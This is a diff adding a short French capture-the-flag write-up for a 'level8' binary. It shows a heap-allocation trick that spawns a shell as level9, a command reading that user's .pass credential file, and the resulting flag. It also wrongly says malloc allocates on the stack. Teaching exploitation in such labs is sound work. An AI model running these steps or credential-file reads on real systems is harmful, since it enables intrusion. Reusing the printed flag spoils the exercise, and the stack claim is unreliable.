@@ -1,0 +1,31 @@
+#	La grosse difficulte a ce level est le reverse engineering, j'ai fais un detail dans Ressources/main.asm
+
+#	Une fois le code mit au propre, on voit que pour que l'appel systeme "/bin/sh" soit lance il faut ecrire quelque chose dans auth[32].
+
+#	Malloc va allouer des elements les uns apres les autres sur la stack, auth se trouvera donc avant service. On peux afficher l'adresse de auth et de service comme cela:
+
+$> ./level8
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+service
+0x804a008, 0x804a018 
+
+#	On va definir le pointeur sur auth avec le premier malloc, puis l'appel a strdup ajoutera l'element suivant sur la stack, si on regarde les adresses on peux voir que 0x804a018 - 0x804a008 = 16.
+
+#	service se trouve donc a auth[16], il suffit de refaire un appel a strdup pour qu'il rajoute a nouveau 16, puis ecrire "login":
+
+$> ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service
+0x804a008, 0x804a018
+service
+0x804a008, 0x804a028
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
